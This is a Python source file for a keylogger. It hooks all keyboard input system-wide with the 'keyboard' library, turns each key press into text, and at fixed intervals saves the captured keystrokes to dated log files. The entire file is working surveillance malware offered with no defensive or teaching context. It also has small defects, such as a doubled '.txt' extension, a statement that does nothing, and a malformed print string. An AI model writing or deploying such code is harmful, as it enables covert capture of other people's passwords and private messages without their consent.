import keyboard
from threading import Timer as thread_timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval, report_method='file'):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[Enter]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt = str(self.start_dt)[:10].replace(" ", "-").replace(":", "")
        end_dt = str(self.end_dt)[:10].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt}_{end_dt}.txt"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt file")

    def report(self):
        # if the log is not empty, save it to a file
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == 'file':
                self.report_to_file()
            self.start_dt
        self.log = ""
        timer = thread_timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_press(callback=self.callback)
        self.report()
        print("f{datetime.now()}] - Keylogger started")
        keyboard.wait()

if __name__ == "__main__":
    logger = Keylogger(interval=60, report_method='file')
    logger.start()
